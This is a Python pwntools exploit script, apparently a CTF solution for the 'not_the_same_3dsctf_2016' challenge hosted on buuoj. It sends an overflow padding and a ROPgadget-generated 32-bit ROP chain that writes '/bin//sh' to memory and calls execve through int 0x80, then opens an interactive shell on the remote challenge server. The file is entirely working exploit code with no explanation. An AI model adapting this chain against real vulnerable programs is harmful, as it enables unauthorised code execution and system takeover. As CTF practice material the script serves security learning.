from pwn import *
from struct import pack


def not_the_same_3dsctf_2016(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/not_the_same_3dsctf_2016'):
    target = process([file_name])
    target = remote('node5.buuoj.cn', 25050)

    # !/usr/bin/env python2
    # execve generated by ROPgadget

    # Padding goes here
    p = b'A' * 0x2D

    p += pack('<I', 0x0806fcca)  # pop edx ; ret
    p += pack('<I', 0x080eb060)  # @ .data
    p += pack('<I', 0x08048b0b)  # pop eax ; ret
    p += b'/bin'
    p += pack('<I', 0x0805586b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806fcca)  # pop edx ; ret
    p += pack('<I', 0x080eb064)  # @ .data + 4
    p += pack('<I', 0x08048b0b)  # pop eax ; ret
    p += b'//sh'
    p += pack('<I', 0x0805586b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806fcca)  # pop edx ; ret
    p += pack('<I', 0x080eb068)  # @ .data + 8
    p += pack('<I', 0x08049423)  # xor eax, eax ; ret
    p += pack('<I', 0x0805586b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481ad)  # pop ebx ; ret
    p += pack('<I', 0x080eb060)  # @ .data
    p += pack('<I', 0x0806fcf1)  # pop ecx ; pop ebx ; ret
    p += pack('<I', 0x080eb068)  # @ .data + 8
    p += pack('<I', 0x080eb060)  # padding without overwrite ebx
    p += pack('<I', 0x0806fcca)  # pop edx ; ret
    p += pack('<I', 0x080eb068)  # @ .data + 8
    p += pack('<I', 0x08049423)  # xor eax, eax ; ret
    p += pack('<I', 0x0807b2af)  # inc eax ; ret
    p += pack('<I', 0x0807b2af)  # inc eax ; ret
    p += pack('<I', 0x0807b2af)  # inc eax ; ret
    p += pack('<I', 0x0807b2af)  # inc eax ; ret
    p += pack('<I', 0x0807b2af)  # inc eax ; ret
    p += pack('<I', 0x0807b2af)  # inc eax ; ret
    p += pack('<I', 0x0807b2af)  # inc eax ; ret
    p += pack('<I', 0x0807b2af)  # inc eax ; ret
    p += pack('<I', 0x0807b2af)  # inc eax ; ret
    p += pack('<I', 0x0807b2af)  # inc eax ; ret
    p += pack('<I', 0x0807b2af)  # inc eax ; ret
    p += pack('<I', 0x0806d8a5)  # int 0x80

    print(p)
    # gdb.attach(target)
    target.sendline(p)
    target.interactive()


if __name__ == '__main__':
    not_the_same_3dsctf_2016()
